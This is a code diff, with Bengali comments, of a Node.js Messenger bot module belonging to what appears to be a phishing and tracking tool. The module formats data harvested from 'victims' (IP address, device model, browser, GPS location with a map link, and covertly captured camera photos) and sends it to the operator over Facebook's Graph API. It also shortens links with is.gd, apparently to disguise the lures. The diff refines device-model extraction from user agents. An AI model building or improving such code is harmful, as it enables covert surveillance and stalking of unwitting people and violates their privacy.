@@ -77,7 +77,7 @@ async function sendMessage(recipientId, text) {
 }
 
 // ================================================================
-// 🆕 ইমেজ মেসেজ (Base64 থেকে অ্যাটাচমেন্ট)
+// ইমেজ মেসেজ
 // ================================================================
 async function sendImageMessage(recipientId, base64Image) {
     try {
@@ -88,7 +88,6 @@ async function sendImageMessage(recipientId, base64Image) {
             return { success: false, error: 'TOKEN_MISSING' };
         }
 
-        // ফেসবুকে ইমেজ পাঠানোর সঠিক ফরম্যাট
         const response = await axios.post(
             `https://graph.facebook.com/v18.0/me/messages?access_token=${token}`,
             {
@@ -120,7 +119,7 @@ async function sendImageMessage(recipientId, base64Image) {
 }
 
 // ================================================================
-// বাকি ফাংশন
+// ইউজার প্রোফাইল
 // ================================================================
 async function getUserProfile(senderId) {
     try {
@@ -135,6 +134,9 @@ async function getUserProfile(senderId) {
     }
 }
 
+// ================================================================
+// লিংক শর্ট করা
+// ================================================================
 async function shortenUrl(longUrl) {
     try {
         const response = await axios.get(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(longUrl)}`, {
@@ -147,6 +149,39 @@ async function shortenUrl(longUrl) {
     }
 }
 
+// ================================================================
+// 🆕 ফোনের মডেল বের করার ফাংশন (ঠিক করা)
+// ================================================================
+function getDeviceModel(device) {
+    const ua = device.userAgent || '';
+    
+    // Android: (Linux; Android 11; vivo 1906 Build/RP1A.200720.012)
+    let match = ua.match(/\([^;]+;\s*[^;]+;\s*([^;\)]+)/);
+    if (match) {
+        // "vivo 1906 Build/RP1A.200720.012" থেকে শুধু "vivo 1906" বা পুরোটা
+        let model = match[1].trim();
+        // Build/ অংশ বাদ দিতে চাইলে:
+        if (model.includes(' Build/')) {
+            model = model.split(' Build/')[0];
+        }
+        return model;
+    }
+    
+    // iOS: (iPhone; CPU iPhone OS 15_0 like Mac OS X)
+    match = ua.match(/\(([^;\)]+); CPU iPhone OS/);
+    if (match) return match[1].trim();
+    
+    // Windows: (Windows NT 10.0; Win64; x64)
+    match = ua.match(/\(Windows NT [^;]+;\s*([^;\)]+)/);
+    if (match) return match[1].trim();
+    
+    // কিছু না পেলে প্লাটফর্ম দেখান
+    return device.platform || 'N/A';
+}
+
+// ================================================================
+// ভিক্টিম ডেটা ফরম্যাট (মডেল ঠিক করা)
+// ================================================================
 function formatVictimData(victim) {
     const d = victim.device || {};
     const deviceTime = new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' });
@@ -155,8 +190,9 @@ function formatVictimData(victim) {
     msg += `⚓️ *আইপি অ্যাড্রেস:* ${victim.ip || 'N/A'}\n`;
     msg += `🕐 *সময়:* ${deviceTime}\n\n`;
     
-    const phoneModel = d.platform || d.userAgent?.split('(')[1]?.split(')')[0] || 'N/A';
-    msg += `📱 *ফোনের মডেল:* ${phoneModel}\n`;
+    // 🆕 ঠিক করা মডেল
+    const model = getDeviceModel(d);
+    msg += `📱 *ফোনের মডেল:* ${model}\n`;
     
     const browser = d.userAgent?.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[0-9.]+/)?.[0] || 'N/A';
     msg += `🌐 *ব্রাউজার:* ${browser}\n`;
@@ -177,7 +213,8 @@ function formatVictimData(victim) {
         msg += `📍 *আনুমানিক অবস্থান:* N/A\n`;
     }
     
-    if (victim.camera && victim.camera.length > 0) {
+    // লোকেশন টাইপ হলে ক্যামেরার কথা দেখাবে না
+    if (victim.type !== 'location' && victim.camera && victim.camera.length > 0) {
         msg += `\n📸 *ক্যামেরা ছবি:* ${victim.camera.length}টি (ছবি আলাদাভাবে আসছে)`;
     }
     
@@ -185,6 +222,9 @@ function formatVictimData(victim) {
     return msg;
 }
 
+// ================================================================
+// লোকেশন মেসেজ
+// ================================================================
 function formatLocationMessage(gpsLocation) {
     if (!gpsLocation || !gpsLocation.latitude) return null;
     const mapLink = gpsLocation.googleMaps || 
@@ -200,9 +240,10 @@ module.exports = {
     getConfig,
     getLocalConfig,
     sendMessage,
-    sendImageMessage,    // <--- নতুন ফাংশন এক্সপোর্ট করা হয়েছে
+    sendImageMessage,
     getUserProfile,
     shortenUrl,
+    getDeviceModel,      // নতুন ফাংশন এক্সপোর্ট
     formatVictimData,
     formatLocationMessage
 };
